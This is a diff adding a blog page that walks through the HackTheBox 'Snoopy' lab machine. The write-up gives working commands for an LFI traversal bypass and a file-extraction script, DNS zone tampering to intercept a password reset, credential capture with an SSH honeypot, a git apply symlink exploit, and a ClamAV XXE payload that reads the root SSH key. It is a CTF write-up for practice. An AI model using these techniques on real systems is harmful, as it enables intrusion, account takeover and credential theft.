@@ -1,0 +1,558 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="robots" content="noindex" />
+
+  <!--  <link rel="manifest" href="/assets/site.webmanifest" crossorigin="use-credentials">-->
+
+  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">
+
+    <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/stylesheet/style.min.css">
+
+    <link id="dark-theme-style" rel="stylesheet" type="text/css"
+          media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
+    href="http://localhost:1337/theme/stylesheet/dark-theme.min.css">
+
+    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
+              media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
+          href="http://localhost:1337/theme/pygments/monokai.min.css">
+    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
+              media="(prefers-color-scheme: light)"
+          href="http://localhost:1337/theme/pygments/emacs.min.css">
+
+
+  <link rel="stylesheet"
+        type="text/css"
+        href="http://localhost:1337/theme/stork/stork.css" />
+
+  <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/font-awesome/css/fontawesome.css">
+  <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/font-awesome/css/brands.css">
+  <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/font-awesome/css/solid.css">
+
+        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/custom.css"> 
+        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/zoom.css"> 
+        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/collapsible-toc.css"> 
+        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/goals.css"> 
+
+
+      <script src="https://code.jquery.com/jquery-3.7.1.min.js" type="application/javascript"></script>
+      <script src="http://localhost:1337/js/collapsible-toc.js" type="application/javascript"></script>
+      <script src="http://localhost:1337/js/zoom.js" type="application/javascript"></script>
+      <script src="http://localhost:1337/js/app.js" type="application/javascript"></script>
+      <script src="http://localhost:1337/js/goals.js" type="application/javascript"></script>
+
+
+
+
+
+
+
+
+
+
+
+ 
+
+<meta name="author" content="Jack69" />
+<meta name="description" content="Snoopy Snoopy is an &#34;Hard&#34; unix box. Enumeration &amp; Fingerprinting The first step has been to enumerate active ports and associated services. Enumerate all opened (TCP) ports: &gt; sudo nmap -p -oN fp-snoopy.nmap 10.10.11.212 Nmap scan report for snoopy.htb (10.10.11.212) Host is up (0 …" />
+<meta name="keywords" content="">
+
+
+  <meta property="og:site_name" content="Jack's Corner"/>
+  <meta property="og:title" content="CTF: HackTheBox Snoopy"/>
+  <meta property="og:description" content="Snoopy Snoopy is an &#34;Hard&#34; unix box. Enumeration &amp; Fingerprinting The first step has been to enumerate active ports and associated services. Enumerate all opened (TCP) ports: &gt; sudo nmap -p -oN fp-snoopy.nmap 10.10.11.212 Nmap scan report for snoopy.htb (10.10.11.212) Host is up (0 …"/>
+  <meta property="og:locale" content="en_US"/>
+  <meta property="og:url" content="http://localhost:1337/ctf/htb/snoopy.html"/>
+  <meta property="og:type" content="article"/>
+  <meta property="article:published_time" content="2023-09-19 18:00:00+02:00"/>
+  <meta property="article:modified_time" content=""/>
+  <meta property="article:author" content="http://localhost:1337/author/jack69.html">
+  <meta property="article:section" content="CTF"/>
+  <meta property="og:image" content="">
+
+  <title>Jack's Corner &ndash; CTF: HackTheBox Snoopy</title>
+
+
+</head>
+<body >
+
+<aside>
+  <div>
+    <a href="http://localhost:1337/">
+      <img src="http://localhost:1337/theme/img/profile.png" alt="Jack's Corner" title="Jack's Corner">
+    </a>
+
+    <h1>
+      <a href="http://localhost:1337/">Jack's Corner</a>
+    </h1>
+
+
+    <div class="stork">
+      <input class="stork-input" type="text" autocomplete="off" name="q" data-stork="sitesearch" placeholder="Search..." onclick="loadStorkIndex()"/>
+      <div class="stork-output" data-stork="sitesearch-output"></div>
+    </div>
+
+
+    <ul class="social">
+      <li>
+        <a class="sc-htb"
+           href="https://app.hackthebox.com/profile/177323"
+           target="_blank">
+          <i class="fa-brands fa-htb"></i>
+        </a>
+      </li>
+      <li>
+        <a class="sc-thm"
+           href="https://tryhackme.com/p/jack69"
+           target="_blank">
+          <i class="fa-brands fa-thm"></i>
+        </a>
+      </li>
+    </ul>
+  </div>
+</aside>
+  <main>
+
+<nav>
+  <a href="http://localhost:1337/">Home</a>
+
+  <a href="/categories.html">Categories</a>
+  <a href="/category/cheatsheet.html">Cheatsheets</a>
+  <a href="/personal/goals.html">Goals</a>
+
+
+</nav>
+
+<article class="single">
+  <header>
+      
+    <h1 id="ctf/htb/snoopy">CTF: HackTheBox Snoopy</h1>
+    <p>
+
+    </p>
+  </header>
+
+
+  <div>
+        <div class="toc col-lg-3 hidden-xs hidden-sm">
+            <div id="toc"><ul><li><a class="toc-href" href="#snoopy" title="Snoopy">Snoopy</a><ul><li><a class="toc-href" href="#enumeration-fingerprinting" title="Enumeration &amp; Fingerprinting">Enumeration &amp; Fingerprinting</a><ul><li><a class="toc-href" href="#dns-zone-transfer" title="DNS Zone Transfer">DNS Zone Transfer</a></li></ul></li><li><a class="toc-href" href="#attacking-snoopyhtb_1" title="Attacking: snoopy.htb">Attacking: snoopy.htb</a></li><li><a class="toc-href" href="#attacking-mmsnoopyhtb" title="Attacking: mm.snoopy.htb">Attacking: mm.snoopy.htb</a></li><li><a class="toc-href" href="#lateral-movement-git-apply-exploit" title='Lateral Movement: "git apply" exploit'>Lateral Movement: "git apply" exploit</a></li><li><a class="toc-href" href="#privilege-escalation" title="Privilege Escalation">Privilege Escalation</a></li></ul></li></ul></div>
+        </div>
+    <h2 id="snoopy">Snoopy</h2>
+<p>Snoopy is an "Hard" unix box.</p>
+<h3 id="enumeration-fingerprinting">Enumeration &amp; Fingerprinting</h3>
+<p>The first step has been to enumerate active ports and associated services.</p>
+<p>Enumerate all opened (TCP) ports:</p>
+<blockquote>
+<p>&gt; sudo nmap -p -oN fp-snoopy.nmap 10.10.11.212<br/>
+Nmap scan report for snoopy.htb (10.10.11.212)<br/>
+Host is up (0.066s latency).<br/>
+Not shown: 65532 closed tcp ports (reset)<br/>
+PORT   STATE SERVICE<br/>
+22/tcp open  ssh<br/>
+53/tcp open  domain<br/>
+80/tcp open  http  </p>
+</blockquote>
+<p>Having all open TCP ports, the next step is to enumerate services and versions running on these:</p>
+<blockquote>
+<p>&gt; sudo nmap -sC -sV -oN -p 22,53,80 snoopy.nmap 10.10.11.212
+Nmap scan report for 10.10.11.212<br/>
+Host is up (0.075s latency).<br/>
+Not shown: 997 closed tcp ports (reset)<br/>
+PORT   STATE SERVICE VERSION<br/>
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)<br/>
+| ssh-hostkey: <br/>
+|   256 ee6bcec5b6e3fa1b97c03d5fe3f1a16e (ECDSA)<br/>
+|<em>  256 545941e1719a1a879c1e995059bfe5ba (ED25519)<br/>
+53/tcp open  domain  ISC BIND 9.18.12-0ubuntu0.22.04.1 (Ubuntu Linux)<br/>
+| dns-nsid:<br/>
+|</em>  bind.version: 9.18.12-0ubuntu0.22.04.1-Ubuntu<br/>
+80/tcp open  http    nginx 1.18.0 (Ubuntu)<br/>
+|_http-title: SnoopySec Bootstrap Template - Index<br/>
+|_http-server-header: nginx/1.18.0 (Ubuntu)<br/>
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel </p>
+</blockquote>
+<h4 id="dns-zone-transfer">DNS Zone Transfer</h4>
+<p>The nmap results show that there's a BIND server exposed; this allows to perform some additional enumeration by querying the DNS server via AXFR protocol.</p>
+<blockquote>
+<p>&gt; dig snoopy.htb @10.10.11.212 axfr<br/>
+snoopy.htb.             86400   IN      SOA     ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400<br/>
+snoopy.htb.             86400   IN      NS      ns1.snoopy.htb.<br/>
+snoopy.htb.             86400   IN      NS      ns2.snoopy.htb.<br/>
+<strong>mattermost.snoopy.htb.</strong>  86400   IN      A       <em>172.18.0.3</em><br/>
+<strong><em>mm.snoopy.htb.</em></strong>          86400   IN      A       127.0.0.1<br/>
+ns1.snoopy.htb.         86400   IN      A       10.0.50.10<br/>
+ns2.snoopy.htb.         86400   IN      A       10.0.51.10<br/>
+<strong>postgres.snoopy.htb.</strong>    86400   IN      A       <em>172.18.0.2</em><br/>
+<strong>provisions.snoopy.htb.</strong>  86400   IN      A       <em>172.18.0.4</em><br/>
+www.snoopy.htb.         86400   IN      A       127.0.0.1<br/>
+snoopy.htb.             86400   IN      SOA     ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400  </p>
+</blockquote>
+<p>Some interesting subdomains are leaked. Moreover, the <em>172.18.0.x</em> addresses resemble those typical of a docker network, which is always a good hint when understanding the topology of the target network.</p>
+<p>The domains resolved as <em>127.0.0.1</em> (A records) are most likely virtualhost; let's add them the the <em>/etc/hosts</em>:</p>
+<blockquote>
+<p>&gt; sudo sh -c "echo '10.10.11.212 snoopy.htb mm.snoopy.htb' &gt;&gt; /etc/hosts" &amp;&amp; cat /etc/hosts<br/>
+# Host addresses<br/>
+127.0.0.1  localhost<br/>
+127.0.1.1  jack-pc<br/>
+<br/> 
+::1        localhost ip6-localhost ip6-loopback<br/>
+ff02::1    ip6-allnodes<br/>
+ff02::2    ip6-allrouters  <br/>
+<br/>
+# Temporary Entries<br/>
+10.10.11.212 snoopy.htb mm.snoopy.htb</p>
+</blockquote>
+<h3 id="attacking-snoopyhtb_1">Attacking: snoopy.htb</h3>
+<p>Heading to http://snoopy.htb leads to a static site.</p>
+<p><img alt='"snoopy.htb landing"' src="snoopy-1.png" title="snoopy.htb landing page"/>)</p>
+<p>In the home page the first thing that cames to the attention is the download function. This allows to download a zip containing some press material of not interest; the most interesting thing is the download function itself. It seems to accept a "file parameter":</p>
+<blockquote>
+<p>http://snoopy.htb/download?<strong>file</strong>=announcement.pdf</p>
+</blockquote>
+<p>Let's try to perform some file inclusion:</p>
+<blockquote>
+<p>&gt; curl http://snoopy.htb/download?file=../../../../../etc/passwd<br/>
+\&lt;empty&gt;</p>
+</blockquote>
+<p>No response, maybe there'se some kind of escaping or blacklisting. In this case my approach is to start from what is already working (file=announcement.pdf) and try to understand what's happening out of my sight by applying some variation to the legitm parameter and doing some assumptions.</p>
+<p>If the server is vulnerable to LFI, to exploit the vulnerability it's needed to / (or an equivalent representation, i.e url-ecode) to be interpreted;
+- announcement.pdf = ./announcement.pdf</p>
+<p>Let's try this variation:</p>
+<blockquote>
+<p>&gt;curl -s 'http://snoopy.htb/download?file=./announcement.pdf' -o out.zip &amp;&amp; unzip -l out.zip<br/>
+<br/>
+Archive:  out.zip<br/>
+...<br/>
+    30732  2023-04-20 17:52   press_package/./announcement.pdf<br/>
+...</p>
+</blockquote>
+<p>It seems that the backend accept the "/" as well as the "."; but when trying:</p>
+<blockquote>
+<p>&gt;curl -s 'http://snoopy.htb/download?file=../press_package/announcement.pdf' -o out.zip
+\&lt;empty&gt;</p>
+</blockquote>
+<p>Again no content, it seems that the "../" gets stripped from the input. Let's assume there's a replace for the "../" chars. It's possible to bypass this control by duplicating each char in the "../" string like this:</p>
+<blockquote>
+<p>. . . . / /</p>
+</blockquote>
+<p>The replace for the "../" will result into the following match:</p>
+<blockquote>
+<p>. . <mark> . . /</mark> /</p>
+</blockquote>
+<p>This is confirmed by running:</p>
+<blockquote>
+<p>&gt;curl -s 'http://snoopy.htb/download?file=....//....//....//....//....//....//....//etc/passwd' -o out.zip &amp;&amp; unzip -l out.zip<br/>
+<br/>
+Archive:  out.zip<br/>
+...<br/>
+    1805  2023-04-25 19:38   press_package/etc/passwd<br/>
+...</p>
+</blockquote>
+<ul>
+<li>[x] Local File Inclusion - Achieved </li>
+</ul>
+<p>Having achieved the LFI, let's try to include something interesting but first, since the exfiltrated file gets zipped, I wrote a bash script to ease the files exfiltration phase.</p>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/bin/bash</span>
+
+<span class="nv">WORDLIST</span><span class="o">=</span><span class="nv">$3</span>
+
+<span class="k">while</span><span class="w"> </span><span class="nb">read</span><span class="w"> </span>guess
+<span class="k">do</span>
+<span class="w">    </span><span class="nv">url</span><span class="o">=</span><span class="s2">"http://snoopy.htb/download.php?file=....//....//....//....//....//....//....//</span><span class="nv">$guess</span><span class="s2">"</span><span class="w"> </span>
+<span class="w">    </span><span class="nb">echo</span><span class="w"> </span>-en<span class="w"> </span><span class="s2">"\033[2K\r</span><span class="nv">$url</span><span class="s2">"</span><span class="w">  </span>
+<span class="w">    </span><span class="nv">content</span><span class="o">=</span><span class="k">$(</span>wget<span class="w"> </span>-q<span class="w"> </span>--content-disposition<span class="w"> </span><span class="nv">$url</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>unzip<span class="w"> </span>-p<span class="w"> </span>press_release.zip<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="k">)</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span>-n<span class="w"> </span><span class="s2">"</span><span class="nv">$content</span><span class="s2">"</span><span class="w"> </span><span class="o">]</span>
+<span class="w">    </span><span class="k">then</span>
+<span class="w">        </span><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">"\n\e[33m[</span><span class="nv">$guess</span><span class="s2">]: \n\e[32m</span><span class="nv">$content</span><span class="s2">\e[39m\n"</span>
+<span class="w">        </span>mkdir<span class="w"> </span>-p<span class="w"> </span><span class="s2">"./dump/</span><span class="k">$(</span>dirname<span class="w"> </span><span class="nv">$guess</span><span class="k">)</span><span class="s2">"</span>
+<span class="w">        </span><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">"</span><span class="nv">$content</span><span class="s2">"</span><span class="w"> </span>&gt;<span class="w"> </span>./dump/<span class="nv">$guess</span>
+<span class="w">    </span><span class="k">fi</span>
+<span class="w">    </span>rm<span class="w"> </span>press_release.zip
+<span class="k">done</span><span class="w"> </span>&lt;<span class="w"> </span><span class="nv">$WORDLIST</span>
+</code></pre></div>
+<p>This script will try to include each guess from a wordlist and print the included file content to the standard output while dumping the file into a dump folder. I've used a seclist wordlist containing typical configuration files found in the /etc directory on linux systems.</p>
+<blockquote>
+<p>&gt; ./lfi_exfiltrator.sh /usr/share/seclists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt<br/>
+...<br/>
+http://snoopy.htb/download.php?file=....//....//....//....//....//....//....///etc/bind/named.conf<br/>
+[/etc/bind/named.conf]:<br/>
+...<br/>
+include "/etc/bind/named.conf.options"; <br/>
+include "/etc/bind/named.conf.local"; <br/>
+include "/etc/bind/named.conf.default-zones"; <br/>
+<br/>
+<strong>key "rndc-key" {<br/>
+    algorithm hmac-sha256;<br/>
+    secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";<br/>
+};</strong> <br/>
+...<br/>
+<br/>
+http://snoopy.htb/download.php?file=....//....//....//....//....//....//....///etc/bind/named.conf.local<br/>
+[/etc/bind/named.conf.local]:
+...<br/>
+zone "snoopy.htb" IN {<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;type master;<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;<strong>file "/var/lib/bind/db.snoopy.htb"</strong>;<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;<strong>allow-update { key "rndc-key"; }</strong>;<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;<strong>allow-transfer { 10.0.0.0/8; }</strong>;<br/>
+};  </p>
+</blockquote>
+<p>...</p>
+<p>Three thing are to be pointed out from the <em>"/etc/bind/named.conf.local"</em> content, starting from the end (<a href="https://www.zytrax.com/books/dns/ch7/xfer.html">check there</a>):<br/>
+    1. The allow-transfer {10.0.0.0/8;} directive is what allowed the AXFR transfer, being the attacker and the vitcim in that ip range<br/>
+    2. The allow-update { key "rndc-key"; } directive states says it's possible to perform some updates to the DNS records having the rndc-key<br/>
+    3. The "/var/lib/bind/db.snoopy.htb" contains the exactly transfered zone with the AXFR protocol.</p>
+<p>The "rndc-key" is served on a platter in the "/etc/bind/named.conf"</p>
+<ul>
+<li>
+<p>Note: before running the script with this wordlist, I've performed some manual enumeration by including the nginx default sites configuration file to check for unreveiled virtual hosts or the /proc/self/environ - cmdline looking for sensitive informations, but not interesting was found.</p>
+</li>
+<li>
+<p>[x] Arbitrary DNS Zone Update - Achived </p>
+</li>
+</ul>
+<p>Now it's possible to alter the zone by adding new records or updating the existing ones. Continuing the snoopy.htb site analysis, the <em>contact.html</em> page catches the eye.</p>
+<p><img alt='"snoopy.htb contact"' src="snoopy-2.png" title="snoopy.htb contact page"/></p>
+<p>The site is warning the user that the 'mail.snoopy.htb' mailserver is currently down due the DNS migration:</p>
+<ul>
+<li>I've now the power to eventually abuse the 'mail.snoopy.htb' domain by adding a malicious record to the DNS zone.</li>
+</ul>
+<p>The <em>about.html</em> page discloses some informations which could really be useful: the SnoopySec team names, roles and emails (and, in a real world scenario, their faces):</p>
+<ul>
+<li>Charles Schultz - CEO - cschultz@snoopy.htb</li>
+<li>Sally Brown - Product Manager - sbrown@snoopy.htb</li>
+<li>Harold Angel - CTO - hangel@snoopy.htb</li>
+<li>Lucy Van Pelt - Accountant - lpelt@snoopy.htb</li>
+</ul>
+<p><img alt='"snoopy.htb about"' src="snoopy-3.png" title="snoopy.htb about page"/></p>
+<h3 id="attacking-mmsnoopyhtb">Attacking: mm.snoopy.htb</h3>
+<p>The http://mm.snoopy.htb responds as a self-hosted Mattermost instance, a collaborative tool used by techicals.</p>
+<p>Knowing some of the SnoopySec team emails and having the ability to alter the DNS zone, let's try impersonate the mail server in order to request a password reset and perform some account takeover.</p>
+<p>To impersonate the mail server I've used the <a href="https://pypi.org/project/fakemail/">fakemail</a> tool:</p>
+<blockquote>
+<p>&gt; sudo fakemail --bind 10.10.14.213:25 --stdout</p>
+</blockquote>
+<p>The tool will listen on port 25 an print on the standard output any smtp request.</p>
+<p>Let's create the malicious DNS A record by remotely updating the dns zone with <em>nsupdate</em>:</p>
+<blockquote>
+<p>&gt; nsupdate -y "hmac-sha256:rndc-key:BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA="<br/>
+&gt; server 10.10.11.212<br/>
+&gt; update add mail.snoopy.htb 86400 A 10.10.14.213<br/>
+&gt; send  </p>
+</blockquote>
+<p>Confirming the dns record is correctly set:</p>
+<blockquote>
+<p>&gt; dig mail.snoopy.htb @10.10.11.212 +short<br/>
+10.10.14.213  </p>
+</blockquote>
+<p>And then request a password reset for the targets, starting with cschultz@snoopy.htb, the CEO</p>
+<p><img alt='"mm.snoopy.htb password reset"' src="snoopy-4.png" title="mm.snoopy.htb password reset"/></p>
+<p>fakemail will print out the sent reset password email:</p>
+<blockquote>
+<p>Envelope-From: no-reply@snoopy.htb<br/>
+Envelope-To: cschultz@snoopy.htb<br/>
+To: cschultz@snoopy.htb<br/>
+Message-ID: <a href="mailto:nhangqptyef1gcah-1695330620@mm.snoopy.htb">nhangqptyef1gcah-1695330620@mm.snoopy.htb</a><br/>
+From: "No-Reply" <a href="mailto:no-reply@snoopy.htb">no-reply@snoopy.htb</a><br/>
+Date: Thu, 21 Sep 2023 21:10:20 +0000<br/>
+Subject: [Mattermost] Reset your password<br/>
+Content-Type: multipart/alternative;<br/>
+ boundary=fd060b70d6291d3e8554315769fe574e788fb5cff28421a4b73e870c62dc<br/>
+<br/>
+Reset Your Password<br/>
+Click the button below to reset your password. If you didn&rsquo;t request this, you can safely ignore this email.<br/>
+<br/>
+Reset Password ( http://mm.snoopy.htb/reset_password_complete?token=qywfomup99rqcprdud51k1afkquz5aqbjp8618b77r7719rhn55zqc3147fscoad )<br/>
+<br/><br/>
+The password reset link expires in 24 hours.<br/>
+<br/><br/>
+Questions?<br/>
+Need help or have questions? Email us at support@snoopy.htb ( support@snoopy.htb )<br/>
+<br/>
+&copy; 2022 Mattermost, Inc. 530 Lytton Avenue, Second floor, Palo Alto, CA, 94301  </p>
+</blockquote>
+<p>By reading the "Town Square" chat it seems that the "AV Claim" antivirus can be found on this server, which can be a useful information.</p>
+<p><img alt='"mm.snoopy.htb chat"' src="snoopy-5.png" title="mm.snoopy.htb chat"/></p>
+<p>After playing (without any result) with Mattermost playbooks, I noticed that there's a command sticking out:</p>
+<p><img alt='"mm.snoopy.htb commands"' src="snoopy-6.png" title="mm.snoopy.htb commands"/></p>
+<p>By running this command, the user is prompted to enter some informations:</p>
+<p><img alt='"mm.snoopy.htb server_provision"' src="snoopy-7.png" title="mm.snoopy.htb server_provision"/></p>
+<p>It seems that a request will be forwarded to some operator which likely will perform some ssh connection (2222 port seems to indicate this). This time, it's an ssh server to be impersonated and luckly some credentials will leak. The tool I've used is <a href="https://github.com/jaksi/sshesame">sshesame</a>, a cool SSH honeypot, with this configuration file:</p>
+<blockquote>
+<p>server:<br/>
+&nbsp;listen_address: 10.10.14.213:2222<br/>
+ssh_proto:<br/>
+&nbsp;version: SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.2<br/>
+&nbsp;banner:  </p>
+<p>&gt; ./sshesame -config config.yaml<br/>
+INFO 2023/09/21 23:46:32 Listening on 10.10.14.213:2222  </p>
+</blockquote>
+<p>After filling up the provision form with my ip address, I got a connection on my honeypot:</p>
+<blockquote>
+<p>2023/09/21 23:47:07 [10.10.11.212:36776] authentication for user "<strong>cbrown</strong>" with password "<strong>sn00pedcr3dential!!!</strong>" accepted<br/>
+2023/09/21 23:47:07 [10.10.11.212:36776] connection with client version "SSH-2.0-paramiko_3.1.0" established<br/>
+2023/09/21 23:47:07 [10.10.11.212:36776] [channel 0] session requested<br/>
+2023/09/21 23:47:07 [10.10.11.212:36776] [channel 0] command "ls -la" requested<br/>
+2023/09/21 23:47:07 [10.10.11.212:36776] [channel 0] closed<br/>
+2023/09/21 23:47:07 [10.10.11.212:36776] connection closed  </p>
+</blockquote>
+<p>Let's try ssh in using these credentials:</p>
+<blockquote>
+<p>ssh cbrown@10.10.11.212<br/>
+cbrown@10.10.11.212's password:<br/>
+<br/>
+cbrown@snoopy:~$</p>
+</blockquote>
+<ul>
+<li>[x] Foothold Completed</li>
+</ul>
+<h3 id="lateral-movement-git-apply-exploit">Lateral Movement: "git apply" exploit</h3>
+<p>Having accessed the machine with the cbrown user, let's what can this user do.</p>
+<blockquote>
+<p>&gt; sudo -l<br/>
+[sudo] password for cbrown:<br/>
+<br/>
+User cbrown may run the following commands on snoopy:<br/>
+&nbsp;&nbsp;(sbrown) PASSWD: /usr/bin/git ^apply -v [a-zA-Z0-9.]+$</p>
+</blockquote>
+<p>It seems that cbrown can run the git apply command as <em>sbrown</em>. Moreover, the git apply is required to have the -v flag and the parameter must match the regex.</p>
+<p>Let's collect more information to understand if it's possibile to abuse the "git apply" command.</p>
+<p>Get git version:</p>
+<blockquote>
+<p>&gt; git --version<br/>
+git version 2.34.1</p>
+</blockquote>
+<p>What does the git apply command with the man command (runned on local machine since the box has no man-db installed):</p>
+<blockquote>
+<p>&gt; man git<br/>
+...<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;git&hyphen;apply(1)<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Apply a patch to files and/or to the index.</p>
+</blockquote>
+<p>It seems that with this command is possible to apply a patch which means that potentially the attacker is able to perform some writes as sbrown in git repositories but, after some exploration, no abusable sbrown files are found.<br/>
+The next step is to understand if there's any known vulnerability for this git version.
+After a quick search on google, a suitable CVE was found:</p>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-23946">CVE-2023-23946</a></li>
+</ul>
+<p>This states, even though not very clearly, that a symlink could possibly be used to overwrite a path outside the working tree. A POC can be found <a href="https://github.com/bruno-1337/CVE-2023-23946-POC">here</a></p>
+<p>I've targeted the <em>authorized_keys</em> file into /home/sbrown.ssh folder, assuming it exists:</p>
+<blockquote>
+<p>&gt; ln -s /home/sbrown/.ssh symlink</p>
+</blockquote>
+<p>Then, I've created the patch file containing the attacker public ssh key:</p>
+<blockquote>
+<p>&gt; cat patch
+diff --git a/symlink b/newsymlink
+rename from symlink
+rename to newsymlink
+--
+diff --git /dev/null b/newsymlink/authorized_keys
+new file mode 100644
+index 0000000..e47f4ea
+--- /dev/null
++++ b/newsymlink/authorized_keys
+@@ -0,0 +1 @@
++ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCy5e7A5AEH5W7S18gXtLVXB3X6+39EI3mSnDJYqtDs7JiVJnJh8H7zI7mSib/G40OKtLMhmmhCgnDEyMU7OSahNYu4t+Xa81y4xaKQ9H11CqWggMSDZBW3E79fjDs+TIl0XZIWF4u1NAqyZQtK+dCh/qf4THlTYSFK3tK6Ofn+h/70O4w5F2tAxYh76GyjRhR4JtNEGXE8V7+E5d8aiqFbmQhM6qspojWNAvTxYh9pnhGRTbAbhAjmMio3r07xkKdRwSljDzGZ5bZs3SOFM+VhGeIHEw0w6Lr9+YGmFekjTDmNnxOjR7BhhUDfh6UeGL4WU9ExuGHfvLSzO2o0rtgtcJzU2Pn4KrTeW7oxCvFMK7nJlRsAAbyMO3Cfaz3F9DQCy3pyufkvYfSzi3w5s44pn8MlHlegCG0b0owI2mpT4X079unHoPRoU3ttQNfFzgai7fxcfXzrnHXPfzOEX4FPgVsJB3RqT6CmDw8Bp0DJWwlkak3uzDuZEioepyvoHRk= jack@jack-pc</p>
+</blockquote>
+<p>Running the sudo command, if the attack succeds, the ssh public key will be written in the <em>authorized_keys</em> file, granting access to the attacker (assuming key authentication is enabled).</p>
+<blockquote>
+<p>&gt; sudo -u sbrown /usr/bin/git apply -v patch</p>
+<p>&gt; ssh -i id_rsa sbrown@10.10.11.212<br/>
+sbrown@snoopy:~$</p>
+</blockquote>
+<ul>
+<li>[x] Lateral Movement Completed</li>
+</ul>
+<h3 id="privilege-escalation">Privilege Escalation</h3>
+<p>Now it's time to get root access. The user sbrown has the following sudo privileges:</p>
+<blockquote>
+<p>&gt; sudo -l<br/>
+User sbrown may run the following commands on snoopy:<br/>
+&amp;nsbp&amp;nbps(root) NOPASSWD: /usr/local/bin/clamscan ^--debug /home/sbrown/scanfiles/[a-zA-Z0-9.]+$</p>
+</blockquote>
+<p>Let's collect more informations like the ClaimAV version:</p>
+<blockquote>
+<p>&gt; clamscan --version<br/>
+ClamAV 1.0.0/26853/Fri Mar 24 07:24:11 2023</p>
+</blockquote>
+<p>It seems that this ClamAV version has a known vulnerability <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-20052">CVE-2023-20052</a>. By forging a malicious DMG file, an XXE vulnerability into the parser allows to leak informations. Being able to run this command as root we could try to exiltrate the root ssh private key, assuming the key exists as /root/.ssh/id_rsa.
+A POC for this vulnerability shown <a href="https://github.com/nokn0wthing/CVE-2023-20052">here</a></p>
+<blockquote>
+<p>&gt; genisoimage -D -V "exploit" -no-pad -r -apple -file-mode 0777 -o test.img . &amp;&amp; dmg dmg test.img test.dmg<br/>
+&gt; bbe -e 's|\&lt;!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;|\&lt;!DOCTYPE plist [\&lt;!ENTITY xxe SYSTEM "/root/.ssh/id_rsa"&gt; ]&gt;|' -e 's/blkx/&amp;xxe\;/' test.dmg -o exploit.dmg  </p>
+</blockquote>
+<p>Move the malicious dmg to the server:</p>
+<blockquote>
+<p>&gt; scp -i id_rsa CVE-2023-20052/exploit.dmg sbrown@10.10.11.212:/home/sbrown/scanfiles</p>
+</blockquote>
+<p>Now it's time to run the scan with sudo privileges:</p>
+<blockquote>
+<p>&gt; sudo /usr/local/bin/clamscan --debug /home/sbrown/scanfiles/exploit.dmg<br/>
+...<br/>
+LibClamAV debug: cli_scandmg: wanted blkx, text value is -----BEGIN OPENSSH PRIVATE KEY-----<br/>
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn<br/>
+NhAAAAAwEAAQAAAYEA1560zU3j7mFQUs5XDGIarth/iMUF6W2ogsW0KPFN8MffExz2G9D/<br/>
+4gpYjIcyauPHSrV4fjNGM46AizDTQIoK6MyN4K8PNzYMaVnB6IMG9AVthEu11nYzoqHmBf<br/>
+...</p>
+</blockquote>
+<p>After storing the key into a file and setting permission to 600, it's possible to ssh in as root:</p>
+<blockquote>
+<p>&gt; ssh -i root_id_rsa root@10.10.11.212<br/>
+root@snoopy:~# id<br/>
+uid=0(root) gid=0(root) groups=0(root)</p>
+</blockquote>
+<ul>
+<li>[x] Rooted!</li>
+</ul>
+  </div>
+  <div class="tag-cloud">
+    <p>
+    </p>
+  </div>
+
+
+
+
+
+
+</article>
+
+<footer>
+<p>&copy; Jack69 - 2024 </p>
+<p>
+Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
+  <span class="footer-separator">|</span>
+  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
+  <script id="dark-theme-script"
+          src="http://localhost:1337/theme/dark-theme/dark-theme.min.js"
